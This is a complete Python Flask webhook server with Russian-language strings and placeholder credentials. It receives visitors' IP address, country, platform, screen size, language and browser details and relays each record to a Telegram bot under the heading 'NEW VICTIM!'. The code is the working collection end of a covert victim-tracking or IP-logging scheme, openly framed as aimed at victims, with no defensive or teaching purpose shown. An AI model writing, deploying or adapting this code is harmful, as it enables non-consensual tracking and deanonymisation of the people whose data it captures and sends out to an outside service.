from flask import Flask, request
import requests
import os

app = Flask(__name__)

TELEGRAM_TOKEN = "ТВОЙ_НОВЫЙ_ТОКЕН"
CHAT_ID = "ТВОЙ_ID"

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Ошибка ТГ: {e}")

@app.route('/', methods=['POST'])
def webhook():
    data = request.json
    if data:
        msg = f"🚨 **НОВАЯ ЖЕРТВА!**\n\n"
        msg += f"🌍 **Страна:** {data.get('country', 'Неизвестно')}\n"
        msg += f"📡 **IP:** {data.get('ip', 'Неизвестно')}\n"
        msg += f"💻 **Платформа:** {data.get('platform', 'Неизвестно')}\n"
        msg += f"📺 **Экран:** {data.get('screen', 'Неизвестно')}\n"
        msg += f"🗣 **Язык:** {data.get('language', 'Неизвестно')}\n"
        msg += f"🌐 **Браузер:** {data.get('userAgent', 'Неизвестно')}"
        send_to_telegram(msg)
        return "OK", 200
    return "Empty", 400

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)